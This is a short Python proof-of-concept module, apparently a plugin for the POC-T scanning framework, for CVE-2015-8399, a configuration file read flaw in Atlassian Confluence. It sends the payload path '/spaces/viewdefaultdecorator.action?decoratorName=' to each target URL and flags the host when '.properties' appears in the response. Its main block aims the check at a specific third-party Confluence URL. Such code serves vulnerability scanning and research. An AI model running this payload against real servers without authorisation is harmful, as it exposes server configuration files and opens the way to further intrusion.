# coding:utf8
__author__ = 'xy'

import requests, time
from lib.utils.urlparser import iterate_path

infostr = """
Atlassian Confluence config file read POC [CVE-2015-8399]

reference:
http://zone.wooyun.org/content/27104
http://www.cnnvd.org.cn/vulnerability/show/cv_id/2016010311
https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-8399

cdxy  May 7 Sat, 2016

usage:python POC-T.py -T -m confluence-file-read -f [path/targetfile] -t [thread-num]

"""


def info():
    return infostr


def exp():
    pass


def poc(_inp):
    try:
        for inp in iterate_path(_inp):
            payloads = ['/spaces/viewdefaultdecorator.action?decoratorName=']
            for each in payloads:
                if '.properties' in requests.get(url=inp + each).content:
                    return True
        return False
    except Exception, e:
        return False


if __name__ == '__main__':
    print info()
    print poc('http://confluence.unlimax.com/ffeac')
